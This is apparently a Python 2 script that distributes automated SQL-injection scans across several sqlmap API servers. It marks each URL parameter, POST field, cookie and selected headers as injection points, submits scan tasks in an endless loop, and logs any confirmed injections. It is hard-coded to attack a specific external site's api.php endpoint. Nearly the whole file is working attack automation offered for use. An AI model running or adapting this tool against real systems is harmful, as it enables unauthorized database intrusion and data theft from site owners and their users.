#!/usr/bin/env python
# -*- coding: utf-8 -*-

import json
import time
import random
import logging
import Color

from config import HOSTS, TIMEOUT, SLEEP_TIME, MAX_TASK_NUMBER, DEFAULT_ADMIN_ID
from config import HEADERS

from sqlmapapi import SQLMapApi
from utils import Url


try:
    basestring
except NameError:
    basestring = string


# 随机选择一个节点
def get_host():
    # 初始化
    host, port, admin_id = '127.0.0.1', 8775, DEFAULT_ADMIN_ID
    host = random.choice(HOSTS)
    pairs = host.split(':')

    if len(pairs) == 2:
        host = pairs[0]
        port = int(pairs[1])
        admin_i = admin_id
    elif len(pairs) == 3:
        host = pairs[0]
        port = int(pairs[1])
        admin_id = pairs[2] or admin_id
    else:
        print '主机端口格式错误'
        return False

    return host, port, admin_id


def get_all_host():
    ret = []
    for i in HOSTS:
        host, port, admin_id = '127.0.0.1', 8775, DEFAULT_ADMIN_ID
        pairs = i.split(':')

        if len(pairs) == 2:
            host = pairs[0]
            port = int(pairs[1])
            admin_i = admin_id
        elif len(pairs) == 3:
            host = pairs[0]
            port = int(pairs[1])
            admin_id = pairs[2] or admin_id
        else:
            print '主机端口格式错误'
            return False
        ret.append((host, port, admin_id))
    return ret


# 污染URL
def url_pollution(url):
    parse = Url.url_parse(url)
    query = parse.query
    if not query:
        query = url
    qs = Url.qs_parse(query)
    for i in qs:
        qs[i] += '*'
    qs = Url.urldecode(Url.build_qs(qs))
    url = Url.url_unparse(
        (parse.scheme,
         parse.netloc,
         parse.path,
         parse.params,
         qs,
         parse.fragment)
    )
    return url

# 污染 querystring
def qs_pollution(qs):
    data = dict(Url.qs_parse(qs))
    data = Url.build_qs(data)
    data = data.replace('&', '*&') + '*'
    return data


# 生成选项
def get_options(url, data, headers):

    method = 'GET'
    if data:
        method = 'POST'

    # 拷贝对象 防止追加星号
    headers = headers.copy()

    # 检查额外参数是否存在 否则添加
    for header in HEADERS:
        if header in ('Referer', 'User-Agent', 'X-Forwarded-For', 'Client-IP', 'X-Real-IP'):
            headers[header] = headers.get(header) or HEADERS.get(header)

    # 污染URL
    url = url_pollution(url)

    # 污染POST数据
    if data and isinstance(data, basestring):
        data = qs_pollution(data)

    # Cookie特殊处理 污染的默认头统一添加星号
    for k, v in headers.iteritems():
        if k == 'Cookie':
            headers[k] = v.replace(';', '*;') + '*'
        elif k in HEADERS.keys():
            headers[k] = v + '*'

    # 转成HTTP头
    headers_str = '\r\n'.join(['{}: {}'.format(k, v)
                               for k, v in headers.iteritems()])

    options = {}
    options['url'] = url
    # 使用自定义头部
    options['headers'] = headers_str

    # 不使用缓存记录
    options['flushSession'] = True
    if data:
        options['method'] = 'POST'
        options['data'] = data
    else:
        options['method'] = 'GET'

    return options


def start_task(options):
    # 创建任务
    taskid = api.task_new()
    if not taskid:
        logging.info('Create Task Failed')
        # print u'创建任务失败'
        return
    # 配置参数 开始任务
    api.scan_start(taskid, options=options)
    return taskid


# 遍历所有节点检查任务状态
def check_host_status():

    for host in get_all_host():
        host, port, admin_id = host
        api = SQLMapApi(host, port, admin_id=admin_id, timeout=TIMEOUT)
        admin_list = api.admin_list()
        if admin_list:
            tasks = admin_list.get('tasks')
            logging.info(
                '[{0}] Task Total Number: {1}'.format(host, len(tasks)))
            logging.info(
                '[{0}] Tasks: {1}'.format(host, json.dumps(tasks, indent=2))) 
            for taskid in tasks:
                status = tasks.get(taskid)

                # 处理跑完的和没有跑起来的
                if status in ('terminated', 'not running'):
                    # 跑完的获取结果查看是否有结果
                    if status == 'terminated':
                        task_data = api.scan_data(taskid)
                        if task_data.get('data'):
                            logging.critical(
                                'Found Inject Task Id: {0}'.format(taskid))
                            logging.critical(
                                'Found Inject Task Id: {0}'.format(json.dumps(task_data.get('data'), indent=2)))
                            # print task_data
                    result = api.task_delete(taskid)
                    if result.get('success'):
                        logging.info('Delete Task Id: {0}'.format(taskid))


def run():

    global url, data, headers, api

    while 1:
        print '#' * (238 / 2)
        check_host_status()
        print '#' * (238 / 2)

        # 获取存在空闲的主机
        host, port, admin_id = get_host()
        api = SQLMapApi(host, port, admin_id=admin_id, timeout=TIMEOUT)
        admin_list = api.admin_list()
        if admin_list:
            tasks = admin_list.get('tasks')
            if len(tasks) >= MAX_TASK_NUMBER:
                logging.info('[{0}] Queue Full'.format(host))
                time.sleep(3)
                continue

        # 开始新任务
        url, data, cookie = url, data, headers
        options = get_options(url, data, cookie)
        taskid = start_task(options)
        logging.info('Create Task Success, Task Id: [{0}]'.format(taskid))

        options['headers'] = options['headers'].split('\r\n')
        logging.info('[{0}] Task Options: {1}'.format(
            taskid, json.dumps(options, indent=2)))

        logging.info('Sleep {0}s'.format(SLEEP_TIME))
        time.sleep(SLEEP_TIME)


if __name__ == '__main__':

    logging.basicConfig(level=logging.DEBUG,
                        format='%(asctime)s %(levelname)s %(message)s')

    logging.info('[+] Host Number: {0}'.format(len(HOSTS)))
    logging.info('[+] Host List: {0}'.format(json.dumps([host.split(':')[0] for host in HOSTS], indent=2)))

    url = 'http://daza.im:82/api.php?username=a1'
    data = ''
    headers = {
        'User-Agent': '132',
        'Cookie': 'a=1',
        'X-Forwarded-For': '1.1.1.1',
        'Accept-Encoding': 'gzip, deflate, sdch',
    }

    run()
